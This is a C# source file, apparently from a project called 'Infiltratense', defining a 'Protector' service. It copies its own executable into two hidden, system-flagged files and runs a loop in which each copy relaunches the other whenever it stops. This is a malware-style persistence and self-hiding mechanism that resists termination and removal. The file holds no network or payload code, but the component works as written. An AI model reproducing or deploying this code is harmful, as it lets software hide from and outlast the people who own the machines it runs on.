using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Infiltratense.Models;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Infiltratense.Service;

namespace Infiltratense.Service
{
    public class Protector : HostService, IService
    {
        public bool Debug;
        public bool Disable;
        public override void Run()
        {
            base.Run();
            Logger.Print("Protector Service Started..");
            new Thread(Protect).Start();
        }
        public void EnsureAB()
        {
            if (File.Exists(CellFileInfo.CurrentPath + $@"\{Strings.ANameExe}") || File.Exists(CellFileInfo.CurrentPath + $@"\{Strings.BNameExe}"))
            {
                Logger.PrintWarning("Deleting the old version...");
            }
            File.Delete(CellFileInfo.CurrentPath + $@"\{Strings.ANameExe}");
            File.Delete(CellFileInfo.CurrentPath + $@"\{Strings.BNameExe}");
            if (!CellFileInfo.AHere())
                CopyFile(CellFileInfo.ProgramFile, CellFileInfo.CurrentPath + $@"\{Strings.ANameExe}");
            if (!CellFileInfo.BHere())
                CopyFile(CellFileInfo.ProgramFile, CellFileInfo.CurrentPath + $@"\{Strings.BNameExe}");
        }

        public void Protect()
        {
            while (true)
            {
                if (Disable)
                {

                }
                else if (CellFileInfo.IsGod)
                {
                    Logger.Print("God Mode. Creating A and B...");
                    EnsureAB();
                    Logger.Print("Starting A...");
                    ProcessService.StartProcess(Strings.ANameExe, Debug);
                    Environment.Exit(0);
                }
                //Only a file here.
                else if (CellFileInfo.OnlyMe())
                {
                    Logger.PrintWarning($"Only me in the folder: {CellFileInfo.SelfName}, Creatring {CellFileInfo.PartnerName}...");
                    CopyFile(CellFileInfo.ProgramFile, CellFileInfo.CurrentPath + $@"\{CellFileInfo.PartnerName}");
                    Logger.PrintWarning($"Starting {CellFileInfo.PartnerName}...");
                    ProcessService.StartProcess(CellFileInfo.PartnerName, Debug);
                }
                //Have a helper file but he is not running.
                else if (ProcessInfo.OnlyMeProcess())
                {
                    Logger.PrintWarning($"Only me running: {CellFileInfo.SelfName}, Starting {CellFileInfo.PartnerName}...");
                    try
                    {
                        ProcessService.StartProcess( CellFileInfo.PartnerName, Debug);
                    }
                    catch (Exception e)
                    {
                        Logger.PrintError("Error Start the partner! " + e.Message);
                    }
                }
                Thread.Sleep(100);
                if (Debug)
                {
                    Thread.Sleep(10000);
                }
            }
        }

        public static void CopyFile(string Source, string Target)
        {
            File.Copy(Source, Target);
            File.SetAttributes(Target, FileAttributes.System);
            File.SetAttributes(Target, FileAttributes.Hidden);
        }
    }
}
